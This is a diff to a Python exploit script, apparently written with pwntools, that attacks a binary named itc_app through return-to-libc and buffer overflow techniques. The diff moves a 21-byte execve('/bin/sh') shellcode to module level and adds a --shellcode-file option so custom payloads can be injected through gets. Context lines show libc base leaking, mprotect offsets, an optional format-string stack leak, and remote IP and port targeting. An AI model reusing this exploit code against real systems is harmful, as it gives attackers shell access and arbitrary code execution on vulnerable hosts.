@@ -16,7 +16,8 @@ leakNo = 30
 leakDelim = b"Welcome"
 useShellcode = True
 writeToStack = False
-
+# 21 bytes execve('/bin/sh') shellcode from https://shell-storm.org/shellcode/files/shellcode-841.html (Bem, 2013)
+shellcode = b"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
 
 static = "./itc_app"
 
@@ -162,9 +163,6 @@ def attemptR2Libc_shellcode(putsOffset, mprotectOff, printfOff, percpOff):
     # Get lib base addr using putsOffset
     libc_address = putsAddr - putsOffset
     log.success(f'LIBC base: {hex(libc_address)}')
-
-    # 21 bytes execve('/bin/sh') shellcode from https://shell-storm.org/shellcode/files/shellcode-841.html (Bem, 2013)
-    shellcode = b"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
     
     # If the user selects to write the shellcode to the stack then leak stack locations via creating a format string vulnerability
     if writeToStack:
@@ -364,6 +362,7 @@ def str2bool(v, argname):
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='Process some integers.')
     parser.add_argument('--offsets', '-o', type=str, help='The path to the offsets input file')
+    parser.add_argument('--shellcode-file', '-sf', type=str, help='A file containing shellcode to be written with gets')
     parser.add_argument('--exe', '-i', type=str, help='The path or ip of target process.')
     parser.add_argument('--port', '-p', type=str, help='The port for the remote process.')
     parser.add_argument('--libc', '-l', type=str, help='Specifies the libc version to use.')
@@ -400,6 +399,15 @@ if __name__ == "__main__":
                 gotGets = int(data['getsGot'],16)
         except FileNotFoundError:
             print(f'File "{args.offsets}" not found. Reverting to default values.')
+
+
+    # Get shellcode bytes from file
+    if args.shellcode_file:
+        try:
+            with open(args.shellcode_file, 'rb') as file:
+                shellcode = file.read()
+        except FileNotFoundError:
+            print(f'File "{args.shellcode_file}" not found. Reverting to execve("/bin/sh") shellcode.')
 
     # Retrieve executable path or remote service ip and port
     if args.exe:
